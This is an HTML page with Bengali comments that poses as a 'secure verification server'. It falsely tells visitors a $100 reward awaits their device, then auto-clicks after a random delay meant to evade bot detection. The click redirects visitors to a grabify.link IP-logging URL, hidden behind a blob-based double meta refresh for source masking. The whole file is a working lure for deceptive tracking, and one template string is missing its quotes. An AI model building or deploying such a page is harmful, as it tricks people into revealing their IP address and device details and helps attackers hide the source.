<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification - Secure Server</title>
    <style>
        body { font-family: -apple-system, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background: white; padding: 35px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; max-width: 420px; width: 92%; border-top: 6px solid #1877f2; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn { background-color: #1877f2; color: white; padding: 16px 32px; border-radius: 10px; font-weight: bold; display: inline-block; cursor: pointer; border: none; font-size: 18px; width: 100%; margin-top: 20px; }
        .status-msg { margin-top: 15px; font-size: 13px; color: #1877f2; font-weight: 500; }
    </style>
</head>
<body>

<div class="card">
    <div id="loader_section">
        <div class="spinner"></div>
        <h2 style="margin-top:20px;">Analyzing Device...</h2>
        <p>Connecting to secure verification server.</p>
    </div>

    <div id="offer_section" style="display: none;">
        <h2 id="headline">Offer Found!</h2>
        <p id="subtext">Special reward found for your device.</p>
        <button id="claimBtn" class="btn" onclick="goToOffer()">Redirecting to Offer...</button>
        <div id="autoMsg" class="status-msg">Verifying session...</div>
    </div>
</div>

<script>
    /* ১. এখানে আপনার আসল লিঙ্কটি বসান */
    const myOfferLink = "https://grabify.link/8TY40W";

    function getDeviceDetails() {
        const ua = navigator.userAgent;
        if (/iPhone|iPad/.test(ua)) return "iPhone";
        if (/Samsung|SM-|GT-|Pixel/.test(ua)) return "Smartphone";
        return "Device";
    }

    /* ২. প্রসেসিং ও অটো-ক্লিক লজিক */
    setTimeout(() => {
        const device = getDeviceDetails();
        document.getElementById("loader_section").style.display = "none";
        document.getElementById("offer_section").style.display = "block";
        document.getElementById("subtext").innerText = "Success! A $100 reward is available for your " + device + ".";
        
        // ৩ থেকে ১২ সেকেন্ডের র‍্যান্ডম ডিলে (বট ডিটেকশন এড়াতে)
        const randomDelay = Math.floor(Math.random() * (12000 - 3000 + 1)) + 3000;

        setTimeout(() => {
            document.getElementById("autoMsg").innerText = "Session Verified. Redirecting...";
            document.getElementById("claimBtn").click();
        }, randomDelay);

    }, 2500);

    /* ৩. সোর্স মাস্কিং (Double Meta Refresh) */
    function goToOffer() {
        const dmrContent = 
            <html>
            <head><meta http-equiv="refresh" content="0; url=${myOfferLink}"></head>
            <body><script>window.location.replace("${myOfferLink}");<\/script></body>
            </html>
        ;
        const blob = new Blob([dmrContent], {type: 'text/html'});
        window.location.href = URL.createObjectURL(blob);
    }
</script>
</body>
</html>
